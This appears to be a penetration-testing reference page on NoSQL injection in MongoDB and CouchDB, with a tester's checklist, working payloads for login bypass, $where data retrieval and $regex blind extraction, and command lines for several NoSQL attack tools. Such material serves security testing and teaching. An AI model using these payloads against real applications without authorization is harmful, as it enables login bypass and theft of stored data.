---
description: >-
  NoSQL injection is where an attacker can manipulate the queries made to a
  NoSQL database through user input.
---

# NoSQL (MongoDB, CouchDB)

## NoSQL injection

**A simple example:**

* A vulnerable web application has the endpoint /search?user={username}
* When a request is made, the application queries a NoSQL database (e.g., MongoDB) like this: `db.users.find({username: {$eq: username}})`
* If an attacker inserts a payload into {username} such as {"$ne": ""}, it may modify the query to retrieve all users.
* The vulnerable application sends this query to the database, potentially leaking all usernames.

It's important to note that payloads may vary depending on the database, query, and application. NoSQL injection can lead to:

* Sensitive data exposure
* Data manipulation
* Denial of service

**Other learning resources:**

**Writeups:**

_Have a good writeup & want to share it here? Drop me a message on_ [_LinkedIn._ ](https://www.linkedin.com/in/kayemba-h-99082a96/)

### Checklist:

* [ ] What is the technology stack you're attacking?
* [ ] What NoSQL DB is being used (MongoDB, CouchDB, etc.)?
* [ ] Verify injection points:
  * [ ] URL parameters
  * [ ] Form fields
  * [ ] HTTP headers (e.g., cookies, etc.)
  * [ ] Out-of-band (data retrieved from a third party)
* [ ] Test with different operators: $eq, $ne, $gt, $gte, $lt, $lte, etc.
* [ ] Can you trigger different responses?
* [ ] Test for login bypass: {"$ne": ""}
* [ ] Test for blind NoSQLi
* [ ] Test for errors
* [ ] Test for conditional responses
* [ ] Test for conditional errors
* [ ] Test for time delays
* [ ] Test for out-of-band interactions
* [ ] Is there a blocklist?
  * [ ] Can you bypass the blocklist?

### Exploitation

```
# basic login bypass
{"username": "anyname", "password": {"$ne": ""}}
```

```
# retrieve data
{"$where": "this.someField == 'someValue'"}
```

```
# blind
{"someField": {"$regex": "^someValue"}}
```

### References & Resources

```bash

# Tools
## Mongobleed https://github.com/joe-desimone/mongobleed
# https://github.com/codingo/NoSQLMap
python NoSQLMap.py
# https://github.com/torque59/Nosql-Exploitation-Framework
python nosqlframework.py -h
# https://github.com/Charlie-belmer/nosqli
nosqli scan -t http://localhost:4000/user/lookup?username=test
# https://github.com/FSecureLABS/N1QLMap
./n1qlMap.py http://localhost:3000 --request example_request_1.txt --keyword beer-sample --extract travel-sample

# Payload: 
' || 'a'=='a

mongodbserver:port/status?text=1

# in URL
username[$ne]=toto&password[$ne]=toto

##in JSON
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$gt":""}, "password": {"$gt":""}}

- Trigger MongoDB syntax error -> ' " \ ; { }
- Insert logic -> ' || '1' == '1' ; //
- Comment out -> //
- Operators -> $where $gt $lt $ne $regex
- Mongo commands -> db.getCollectionNames()
```
